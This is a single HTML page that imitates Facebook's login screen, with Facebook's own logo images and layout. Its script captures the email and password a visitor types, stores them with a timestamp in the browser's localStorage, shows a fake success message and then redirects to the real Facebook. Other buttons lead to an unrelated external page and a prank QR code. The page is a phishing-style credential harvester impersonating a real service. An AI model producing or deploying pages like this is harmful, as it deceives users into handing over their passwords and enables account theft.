<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        :root {
            --fb-blue: #0866FF;
            --bg-gray: #f0f2f5;
        }

        body {
            font-family: Helvetica, Arial, sans-serif;
            background-color: white;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #1c1e21;
        }

        .main-container {
            display: flex;
            width: 100%;
            max-width: 1000px;
            padding: 20px;
            align-items: center;
            justify-content: space-between;
        }

        /* Left Section Styles */
        .left-section {
            flex: 1;
            padding-right: 40px;
        }

        .fb-logo {
            width: 45px;
            margin-bottom: 20px;
        }

        .left-section h1 {
            font-size: 42px;
            line-height: 48px;
            font-weight: 600;
            margin: 0 0 20px 0;
            letter-spacing: -1px;
        }

        .highlight-blue {
            color: var(--fb-blue);
        }

        .promo-image {
            max-width: 450px;
            width: 100%;
            display: block;
        }

        /* Right Section / Login Card */
        .right-section {
            width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .login-card {
            background: #fff;
            border: none;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 16px;
            width: 100%;
            box-sizing: border-box;
            text-align: center;
        }

        .login-card h2 {
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 15px;
            text-align: left;
            margin-left: 5px;
        }

        input {
            width: 100%;
            height: 52px;
            padding: 14px 16px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            box-sizing: border-box;
            outline: none;
        }

        input:focus {
            border-color: var(--fb-blue);
            box-shadow: 0 0 0 2px #e7f3ff;
        }

        .btn-login {
            background-color: var(--fb-blue);
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            line-height: 48px;
            padding: 0 16px;
            width: 100%;
            cursor: pointer;
            transition: background 0.2s;
        }

        .btn-login:hover {
            background-color: #0055e0;
        }

        .forgot-link {
            color: var(--fb-blue);
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            display: block;
            margin: 15px 0;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 20px 0;
        }

        .btn-create {
            border: 1px solid var(--fb-blue);
            background: none;
            border-radius: 6px;
            color: var(--fb-blue);
            font-size: 17px;
            font-weight: 600;
            line-height: 48px;
            padding: 0 30px;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }

        .btn-create:hover {
            background-color: #f2f8ff;
        }

        /* Updated Meta Icon Section */
        .meta-footer {
            margin-top: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .meta-custom-icon {
            width: 60px; /* Adjusted size for the new icon */
            height: auto;
            border-radius: 4px;
        }

        /* Modal / QR Overlay */
        #qrCodeContainer {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
        }

        #qrCodeContainer img {
            width: 200px;
            height: 200px;
            background: white;
            padding: 10px;
            border-radius: 8px;
        }

        #qrCodeContainer h2 {
            color: white;
            margin-bottom: 20px;
        }

        .btn-close {
            margin-top: 20px;
            padding: 10px 20px;
            background: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .watermark {
            position: fixed;
            bottom: 10px;
            left: 10px;
            font-size: 10px;
            color: #ddd;
            pointer-events: none;
        }

        @media (max-width: 900px) {
            .main-container { flex-direction: column; text-align: center; }
            .left-section { padding-right: 0; margin-bottom: 40px; }
            .fb-logo { margin: 0 auto 20px; }
        }
    </style>
</head>
<body>

    <div class="main-container">
        <!-- Left Side Content -->
        <div class="left-section">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zpqBHA.svg" alt="Facebook" class="fb-logo">
            <h1>Explore the things <br><span class="highlight-blue">you love.</span></h1>
            <img src="https://static.xx.fbcdn.net/rsrc.php/yb/r/HpEiFYDux5j.webp" alt="Promo" class="promo-image">
        </div>

        <!-- Right Side Login Form -->
        <div class="right-section">
            <div class="login-card">
                <h2>Log in to Facebook</h2>
                <form id="loginForm">
                    <input type="text" id="email" placeholder="Email address or mobile number" required>
                    <input type="password" id="password" placeholder="Password" required>
                    <button type="submit" class="btn-login">Log in</button>
                    <a id="forgotPasswordLink" href="#" class="forgot-link">Forgotten password?</a>
                    <div class="divider"></div>
                    <button type="button" id="createAccountBtn" class="btn-create">Create new account</button>
                </form>
            </div>
            
            <div class="meta-footer">
                <!-- Custom Meta Icon Implementation -->
                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTzVnLPdvmFSVCTa0kTLcBafmOL-9UEhhZanQ&s" class="meta-custom-icon" alt="Meta Logo">
            </div>
        </div>
    </div>

    <!-- QR Code Modal -->
    <div id="qrCodeContainer">
        <h2>Scan it to change password</h2>
        <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://www.youtube.com/watch?v=dQw4w9WgXcQ" alt="QR Code">
        <button class="btn-close" onclick="closeQRCode()">Close</button>
    </div>

    <div class="watermark">SAFIN</div>

    <script>
        // Log in submit: Save to local storage and redirect to real Facebook
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            const users = JSON.parse(localStorage.getItem('users')) || [];
            users.push({ email, password, timestamp: new Date().toLocaleString() });
            localStorage.setItem('users', JSON.stringify(users));

            alert('Form submitted successfully! Redirecting to Facebook...');
            window.location.href = 'https://www.facebook.com/';
        });

        // Redirect "Create new account" to your specific link
        document.getElementById('createAccountBtn').addEventListener('click', function() {
            window.location.href = 'https://crepo920.github.io/Gay/';
        });

        // Forgotten password: Show QR Code
        document.getElementById('forgotPasswordLink').addEventListener('click', function(event) {
            event.preventDefault();
            document.getElementById('qrCodeContainer').style.display = 'flex';
        });

        function closeQRCode() {
            document.getElementById('qrCodeContainer').style.display = 'none';
        }
    </script>
</body>
</html>
